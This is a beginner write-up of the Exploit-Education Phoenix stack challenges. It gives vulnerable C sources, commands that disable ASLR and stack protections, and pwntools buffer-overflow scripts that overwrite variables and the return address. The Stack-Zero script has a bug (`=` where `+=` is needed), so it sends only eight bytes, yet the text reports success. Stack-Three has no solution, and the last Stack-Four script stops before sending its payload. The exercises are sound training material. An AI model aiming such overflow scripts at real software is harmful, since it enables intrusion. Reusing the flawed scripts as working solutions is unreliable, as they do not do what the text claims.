# Exploit-Education (Phoenix) Write UP

## Intro
Simple challenges that help beginners to learn how to hacc.

### Setup
I did these challenges by copying and pasting the source code and compiling it myself rather than utilizing the shell that they provided.
When compiling, make sure to disable PIE and Canary if you don't want to be dealing with those. E.g.:
`gcc stack-four.c -o stack-four -fno-stack-protector -no-pie`
Also make sure to disable ASLR:
`sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'`
Check whether ASLR is defaulted 1 or 2 through:
`cat /proc/sys/kernel/randomize_va_space'`
To re-enable: `sudo bash -c 'echo *ASLR level* > /proc/sys/kernel/randomize_va_space'`

Also, I had to change `LEVELNAME` to just a normal string.

### Tools
* GDB (GEF plugin)
* `pwntools` - I highly recommend looking through the tutorial and the docs on `pwntools`
* Disassembler (Cutter)

---

## Stack
---
### Stack-Zero
Stack-Zero teaches us that it's possible to change variables by overflowing the buffer with the right amount of bytes if an exploitable function (e.g. `gets()`) is used.

Source Code:
```c
#define BANNER "Welcome to Stack-Zero, brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

We can see that this program uses the `gets()` function. The description of `gets()` can be read through `man 3 gets`:
<!-- getsfunctiondescription image -->
![getsfunctiondescription](../Images/PhoenixExploit/getsfunctiondescription.jpg)
This highlights that the exploitable vulnerability lies within the `gets()` function. We can see that `gets()` will keep taking input until an EOF or newline is fed through. This means that we can keep feeding bytes through past the original number of bytes that were intended for the size of the buffer.
These bytes will leak over to other segments of the stack which could be detrimental to the program.

Through `disas main`, we can see that the compiler did some stuff:
<!-- disassembler and gdb pic, add stack drawing -->
![stackzerodisasmain](../Images/PhoenixExploit/stackzerodisasmain.jpg)

We can get a better picture through looking at it in a disassembler:
<!-- disassembler pic -->
![stackzerocutter](../Images/PhoenixExploit/stackzerocutter.jpg)

What we really need to pay attention to are `var char *s @ rbp-0x50` and `var int64_t var_10h @ rbp-0x10`. If we study the disassembly carefully we can see that these are the `buffer` and `changeme` variables, respectively.

If we display the stack build up in an image:
<!-- stack jpg -->
![stackzerostack](../Images/PhoenixExploit/stackzerostack.jpg)

We can see that `buffer` is 64 bytes and immediately before that is `changeme`.
This means that if we feed the buffer 65 characters we can solve this challenge.

Final Script:
```python
from pwn import * # import pwn library

# attach process
p = process('./stack-zero') # vuln is the executable file name

# variables
BUF_LEN = 64 # length of buffer

# create payload
payload = b'A'*BUF_LEN # create padding of BUF_LEN bytes
payload = b'BBBBBBBB' # this can be whatever garbage bytes

# receive until bytes is met
p.recvuntil(b'Welcome to Stack-Zero, brought to you by https://exploit.education') # receive everything until this line

# send payload
p.sendline(payload) # send payload as one line

# to get a shell
p.interactive()
```

Great success!
<!-- stackzerosuccess -->
![stackzerosuccess](../Images/PhoenixExploit/stackzerosuccess.jpg)

---
### Stack-One
Stack-One is almost identical to Stack-Zero. The catch, however, is that we have to alter the `changeme` to a specific variable. This forces us to calculate the exact number of bytes that are required to reach `changeme`.
Furthermore, we are obligated to provide a command line argument, rather than it prompting us for an input.

```c
#define BANNER "Welcome to Stack-One, brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```

Through GDB `disas main` and our disassembler, we can see that the stack is built in a similar fashion as Stack-Zero.
<!-- stackonedisasmain -->
![stackonedisasmain](../Images/PhoenixExploit/stackonedisasmain.jpg)

However, if we see in the next image, we can see that `var_10h` is being compared with a value:
<!-- stackonecutter -->
![stackonecutter](../Images/PhoenixExploit/stackonecutter.jpg)
More specifically, it is being compared with value `0x496c5962`.

So, to sum up, we need to have a padding of 64 bytes and then have `changeme` equal `0x496c5962`.
Fortunately, `pwntools` has a great way of helping us convert `0x496c5962` into bytes in little-endian format (x86 and x64 architectures are in little-endian format) and allow for us to feed it through as an command line argument.

Final Script:
```python
from pwn import * # import everything from pwn

# variables
BUF_LEN = 64 # buffer size
win = pack(0x496c5962, None, 'little', True) # 0x496c5962 in little endian is bYlI

# payload
payload = b'A'*BUF_LEN # our padding
payload += win # changeme

# attach process with command line arguments
p = process(argv=['./stack-one', payload])

# to get a shell
p.interactive()
```

Great success!
<!-- stackonesuccess -->
![stackonesuccess](../Images/PhoenixExploit/stackonesuccess.jpg)

---
### Stack-Two
Stack-Two is incredibly similar to Stack-Zero and Stack-One, however, this has to be done through environmental variables.

Source Code:
```c
#define BANNER "Welcome to Stack-Two, brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```

Once again, through GDB and our disassembler we can get a rough idea of what our stack will look like:
<!-- stacktwodisasmain -->
![stacktwodisasmain](../Images/PhoenixExploit/stacktwodisasmain.jpg)

<!-- stacktwocutter1 -->
![stacktwocutter1](../Images/PhoenixExploit/stacktwocutter1.jpg)

We can see that the stack is built incredibly similar to Stack-Zero (the components we care about in this challenge, at least).
This time, however, `changeme` is being compared with `0xd0a090a`.
<!-- stacktwocutter2 -->
![stacktwocuttere2](../Images/PhoenixExploit/stacktwocutter2.jpg)

Again, `pwntools` helps us with environmental variables too.

Final Exploit:
```python
from pwn import * # import everything from pwn

# variables
BUF_LEN = 64 # 64 bytes to reach changeme
win = pack(0x0d0a090a, None, 'little', True) # 0x0d0a090a in little endian is \n\t\n\r

# payload
payload = b'A'*BUF_LEN # padding till changeme
payload += win # changeme

# attach a process
p = process(argv=['./stack-two'], env=dict(ExploitEducation=payload)) # process and set environmental variable ExploitEducation equal our payload

# get a shell
p.interactive()
```

Great success!
<!-- stacktwosuccess -->
![stacktwosuccess](../Images/PhoenixExploit/stacktwosuccess.jpg)

---
### Stack-Three
Stack-Three requires us to overwrite a function pointer to execute the function `complete_level()`.

Source code:
```c

#define BANNER "Welcome to Stack-Three, brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished Stack-Three :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```



---
### Stack-Four
Stack-Four introduces buffer overflow to overwrite the instruction pointer.

Source code:
```c
#define BANNER "Welcome to Stack-Four, brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished Stack-Four :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

In this challenge, `main()` calls another function called `start_level()` to do stuff (get input and print). As opposed to `main()` doing it like in the challenges before.

Final script:
```python
from pwn import *

p = process('./vuln')

# variables
BUF_RIP = 88 # bytes from start of buffer to $rip
complete_level = 0x401196 # address of complete_level

# payload
payload = b'A'*BUF_RIP # padding to $rip
payload += p64(complete_level) # address of complete_level in $rip

# receive
p.recvuntil(b'Welcome to Stack-Four, brought to you by https://exploit.education')

# send payload
p.sendline(payload)

# do this
p.interactive()
```

or

```python
from pwn import *

p = process('./vuln')
e = ELF('./vuln')

# variables
BUF_RIP = 88 # bytes from start of buffer to $rip
complete_level = e.symbols['complete_level'] # address of complete_level

# payload
payload = b'A'*BUF_RIP # padding to $rip
payload += p64(complete_level) # address of complete_level in $rip
```